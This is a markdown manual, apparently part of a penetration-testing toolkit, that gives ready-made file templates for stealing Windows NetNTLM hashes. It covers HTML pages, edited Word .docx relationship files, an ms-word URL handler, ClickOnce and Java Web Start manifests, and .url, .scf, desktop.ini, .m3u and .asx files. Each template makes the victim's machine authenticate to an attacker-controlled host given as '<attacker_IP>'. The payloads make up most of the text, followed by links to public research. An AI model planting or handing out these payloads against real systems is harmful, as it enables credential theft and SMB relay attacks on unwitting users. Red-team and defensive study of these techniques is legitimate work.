# Manual

## 01 - Internet Explorer or Microsoft Edge

```html
<!DOCTYPE html>
<html>
	<img src="file://<attacker_IP>/leak/leak.png"/>
</html>
```

## 02 - Microsoft Office subDoc

Extract `.docx` file using `7zip` or `unzip` and modify the contents in `word\_rels\settings.xml.rels`.

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
	<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file://<attacker_IP>/leak/Template.dotx" TargetMode="External"/>
</Relationships>
```

Using a URL handle with `ms-word:ofe|u|` scheme can trigger SMB relay.

```html
<!DOCTYPE html>
<html>
	<script>
		location.href = 'ms-word:ofe|u|\\<attacker_IP>\leak\leak.docx';
	</script>
</html>
```

## 03 - ClickOnce

TODO: check `.manifest` and `.appref-ms` to reproduce it.

Name it with `.application` extension.

```xml
<?xml version="1.0" encoding="utf-8"?>
<asmv1:assembly xsi:schemaLocation="urn:schemas-microsoft-com:asm.v1 assembly.adaptive.xsd" manifestVersion="1.0" xmlns:dsig="http://www.w3.org/2000/09/xmldsig#" xmlns="urn:schemas-microsoft-com:asm.v2" xmlns:asmv1="urn:schemas-microsoft-com:asm.v1" xmlns:asmv2="urn:schemas-microsoft-com:asm.v2" xmlns:xrml="urn:mpeg:mpeg21:2003:01-REL-R-NS" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
	<assemblyIdentity name="Leak.app" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" xmlns="urn:schemas-microsoft-com:asm.v1" />
	<description asmv2:publisher="Leak" asmv2:product="Leak" asmv2:supportUrl="" xmlns="urn:schemas-microsoft-com:asm.v1" />
	<deployment install="false" mapFileExtensions="true" trustURLParameters="true" />
	<dependency>
		<dependentAssembly dependencyType="install" codebase="file://<responder ip>/snare/Program.exe.manifest" size="32909">
			<assemblyIdentity name="Program.exe" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" type="win32" />
			<hash>
				<dsig:Transforms>
					<dsig:Transform Algorithm="urn:schemas-microsoft-com:HashTransforms.Identity" />
				</dsig:Transforms>
				<dsig:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1" />
				<dsig:DigestValue>ESZ11736AFIJnp6lKpFYCgjw4dU=</dsig:DigestValue>
			</hash>
		</dependentAssembly>
	</dependency>
</asmv1:assembly>
```

## 04 - Java Web Start

Name it with `.jnlp` extension.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<jnlp spec="1.0+" codebase="" href="">
	<resources>
		<jar href="file://<<attacker_IP>>/leak/leak.jar"/>
	</resources>
	<application-desc/>
</jnlp>
```

## 05 - Internet Shortcut File

SMB link and name it with `.url` extension.

```
[InternetShortcut]
URL=https://website.com
IconIndex=0
IconFile=\\<attacker_IP>\snare\file.ico
```

WebDAV link.

```
[InternetShortcut]
URL=file://<attacker_IP>/@snare
```

## 06 - Shell Command Files

Name it with `.scf` extension.

```
[Shell]
Command=2
IconFile=\\<attacker_IP>\snare\file.ico
[Taskbar]
Command=ToggleDesktop
```

## 07 - Desktop.ini

Name it with `.ini` extension.

```
C:\> mkdir openMe
attrib +s openMe
cd openMe
echo [.ShellClassInfo] > desktop.ini
echo IconResource=\\<attacker_IP>\snare >> desktop.ini
attrib +s +h desktop.ini
```

```
[.ShellClassInfo]
IconResource=\\<attacker_IP>\snare
```

## 08 - Windows Media Player

Name it with `.m3u` extension.

```
#EXTM3U
#EXTINF:1337, Snare
\\<attacker_IP>\file.mp3
```

Name it with `.asx` extension.

```
<asx version="3.0">
	<title>Leak</title>
	<entry>
		<title></title>
		<ref href="file://<attacker_IP>/snare/file.wma"/>
	</entry>
</asx>
```

---
## References

### Rhino Security Labs

- [Rhino Security Labs: Abusing Microsoft Word Features for Phishing - "subDoc"](https://rhinosecuritylabs.com/research/abusing-microsoft-word-features-phishing-subdoc/)

### Securify

- [Securify: Living off the Land Stealing NetNTLM Hashes](https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes/)

### Osanda

- [Osanda: Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)

### Mubix

- [Malicious.link: SMB/HTTP Auth Capture via SCF File](https://room362.com/posts/2016/smb-http-auth-capture-via-scf/)

### 1337Red

- [1337red: Using A SCF File to Gather Hashes](https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/)

### Pentest Lab

- [Pentestlab Blog: Microsoft Office - NTLM Hashes via Frameset](https://pentestlab.blog/2017/12/18/microsoft-office-ntlm-hashes-via-frameset/)

- [Pentestlab Blog: SMB Share SCF File Attacks](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)